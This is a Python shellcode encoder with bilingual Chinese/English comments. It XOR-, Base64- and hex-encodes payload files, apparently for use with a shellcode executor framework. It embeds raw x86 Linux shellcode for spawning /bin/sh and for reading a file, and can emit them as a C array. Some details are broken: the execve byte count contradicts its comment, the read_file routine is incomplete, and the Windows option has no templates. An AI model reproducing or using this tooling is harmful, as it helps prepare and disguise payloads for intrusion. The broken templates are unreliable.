#!/usr/bin/env python3
"""
Shellcode 编码工具 / Shellcode Encoder Utility
=============================================

与 Shellcode Executor 框架兼容的 Shellcode 编码辅助工具。
A Python helper tool for encoding shellcode, compatible with
the Shellcode Executor framework.

支持编码方式 / Supported Encodings:
  - XOR       : 单键或多键异或 / Single or multi-byte XOR
  - Base64    : 标准 Base64 编码 / Standard Base64
  - Hex       : 多种 Hex 格式输出 / Multiple hex output styles
  - Generate  : 生成常见 shellcode 模板 / Generate common patterns

示例 / Examples:
  python3 encode_shellcode.py xor --key AB shellcode.bin -o encoded.bin
  python3 encode_shellcode.py base64 shellcode.bin
  python3 encode_shellcode.py hex --style hexdump shellcode.bin
  python3 encode_shellcode.py generate --platform linux --type execve
"""

import argparse
import base64
import os
import sys


def xor_encode(data: bytes, key: bytes) -> bytes:
    """
    XOR 编码 / XOR encode data with repeating key.

    使用重复密钥对数据进行 XOR 编码。
    Encodes data using XOR with a repeating key pattern.

    Args:
        data: 原始字节数据 / Raw byte data
        key:  XOR 密钥 / XOR key bytes

    Returns:
        编码后的字节数据 / Encoded byte data
    """
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))


def format_hex(data: bytes, style: str = "raw") -> str:
    """
    Hex 格式化 / Format bytes as hex string.

    支持多种输出风格，适用于不同的使用场景。
    Supports multiple output styles for different use cases.

    Args:
        data:  字节数据 / Byte data
        style: 输出风格 / Output style (raw/space/carray/hexdump)

    Returns:
        格式化后的字符串 / Formatted string
    """
    if style == "raw":
        # 纯大写十六进制 / Raw uppercase hex
        return data.hex().upper()
    elif style == "space":
        # 空格分隔 / Space-separated hex bytes
        return " ".join(f"{b:02X}" for b in data)
    elif style == "carray":
        # C 语言数组声明 / C-style array declaration
        arr = ", ".join(f"0x{b:02X}" for b in data)
        return (f"unsigned char shellcode[] = {{ {arr} }};\n"
                f"unsigned int len = {len(data)};")
    elif style == "hexdump":
        # 带 ASCII 预览的 hexdump / Hexdump with ASCII preview
        result = []
        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            hex_part = " ".join(f"{b:02X}" for b in chunk)
            ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
            result.append(f"{i:08x}  {hex_part:<48}  {ascii_part}")
        return "\n".join(result)
    else:
        return data.hex()


def load_file(path: str) -> bytes:
    """
    加载二进制文件 / Load binary file.

    Args:
        path: 文件路径 / File path

    Returns:
        文件二进制内容 / Binary file content
    """
    with open(path, "rb") as f:
        return f.read()


def save_file(path: str, data: bytes):
    """
    保存二进制文件 / Save binary file.

    Args:
        path: 输出路径 / Output file path
        data: 要写入的字节数据 / Byte data to write
    """
    with open(path, "wb") as f:
        f.write(data)


def generate_shellcode(platform: str, stype: str) -> bytes:
    """
    生成常见 shellcode / Generate common shellcode patterns.

    提供常用 shellcode 的模板数据，便于演示和测试。
    Provides template shellcode data for demonstration and testing.

    Args:
        platform: 目标平台 / Target platform (linux/windows)
        stype:    Shellcode 类型 / Shellcode type (execve/read_file)

    Returns:
        Shellcode 字节数据 / Shellcode bytes

    Raises:
        ValueError: 不支持的组合 / Unsupported platform/type combination
    """
    # Shellcode 模板字典 / Template dictionary
    shellcodes = {
        # Linux execve("/bin/sh", NULL, NULL) - 23字节 / 23 bytes
        ("linux", "execve"): bytes([
            0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68,
            0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
            0x53, 0x89, 0xe1, 0x99, 0xb0, 0x0b, 0xcd, 0x80,
        ]),
        # Linux 读文件 / Read file shellcode
        ("linux", "read_file"): bytes([
            0x31, 0xc0, 0x31, 0xdb, 0x31, 0xc9, 0xeb, 0x10,
            0x59, 0x88, 0xcb, 0xb0, 0x05, 0xcd, 0x80, 0x31,
            0xc9, 0x89, 0xc3, 0xb0, 0x03, 0xcd, 0x80,
        ]),
    }

    key = (platform, stype)
    if key in shellcodes:
        return shellcodes[key]
    raise ValueError(f"不支持的 shellcode 类型 / Unknown type: {platform}/{stype}")


def main():
    """主入口 / Main entry point."""
    parser = argparse.ArgumentParser(
        description="Shellcode 编码工具 / Shellcode Encoder Utility",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例 / Examples:
  %(prog)s xor --key AB input.bin -o encoded.bin
  %(prog)s base64 shellcode.bin
  %(prog)s hex --style carray payload.bin
  %(prog)s generate --platform linux --type execve
        """
    )

    subparsers = parser.add_subparsers(dest="command", help="编码方式 / Encoding method")

    # XOR 子命令 / XOR subcommand
    xor_parser = subparsers.add_parser("xor", help="XOR 编码 / XOR encoding")
    xor_parser.add_argument("input", help="输入文件 / Input shellcode file")
    xor_parser.add_argument("-k", "--key", required=True, help="XOR 密钥(十六进制) / Key (hex)")
    xor_parser.add_argument("-o", "--output", help="输出文件 / Output file")

    # Base64 子命令 / Base64 subcommand
    b64_parser = subparsers.add_parser("base64", help="Base64 编码 / Base64 encoding")
    b64_parser.add_argument("input", help="输入文件 / Input shellcode file")
    b64_parser.add_argument("-o", "--output", help="输出文件 / Output file")

    # Hex 子命令 / Hex subcommand
    hex_parser = subparsers.add_parser("hex", help="Hex 编码 / Hex encoding")
    hex_parser.add_argument("input", help="输入文件 / Input shellcode file")
    hex_parser.add_argument("-s", "--style", default="raw",
                            choices=["raw", "space", "carray", "hexdump"],
                            help="输出格式 / Output format style")
    hex_parser.add_argument("-o", "--output", help="输出文件 / Output file")

    # 生成子命令 / Generate subcommand
    gen_parser = subparsers.add_parser("generate", help="生成 shellcode / Generate shellcode")
    gen_parser.add_argument("--platform", default="linux",
                            choices=["linux", "windows"],
                            help="目标平台 / Target platform")
    gen_parser.add_argument("--type", default="execve",
                            choices=["execve", "read_file"],
                            help="Shellcode 类型 / Shellcode type")
    gen_parser.add_argument("-o", "--output", help="输出文件 / Output file")

    args = parser.parse_args()

    if args.command == "xor":
        # XOR 编码流程 / XOR encoding workflow
        data = load_file(args.input)
        key = bytes.fromhex(args.key)
        encoded = xor_encode(data, key)
        print(f"[+] XOR 完成 / Done: {len(data)} -> {len(encoded)} bytes")
        print(f"[+] 密钥 / Key: {args.key}")
        if args.output:
            save_file(args.output, encoded)
            print(f"[+] 已保存 / Saved to: {args.output}")
        else:
            print(encoded.hex())

    elif args.command == "base64":
        # Base64 编码流程 / Base64 encoding workflow
        data = load_file(args.input)
        encoded = base64.b64encode(data)
        print(f"[+] Base64 完成 / Done: {len(data)} -> {len(encoded)} bytes")
        if args.output:
            with open(args.output, "w") as f:
                f.write(encoded.decode("ascii"))
            print(f"[+] 已保存 / Saved to: {args.output}")
        else:
            print(encoded.decode("ascii"))

    elif args.command == "hex":
        # Hex 格式化流程 / Hex formatting workflow
        data = load_file(args.input)
        result = format_hex(data, args.style)
        print(f"[+] Hex 格式化 ({args.style}):")
        print(result)
        if args.output:
            with open(args.output, "w") as f:
                f.write(result)
            print(f"[+] 已保存 / Saved to: {args.output}")

    elif args.command == "generate":
        # 生成 shellcode 流程 / Shellcode generation workflow
        try:
            data = generate_shellcode(args.platform, args.type)
            print(f"[+] 已生成 / Generated: {args.platform}/{args.type}")
            print(f"[+] 大小 / Size: {len(data)} bytes")
            print(format_hex(data, "hexdump"))
            if args.output:
                save_file(args.output, data)
                print(f"[+] 已保存 / Saved to: {args.output}")
        except ValueError as e:
            print(f"[!] {e}")
            sys.exit(1)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()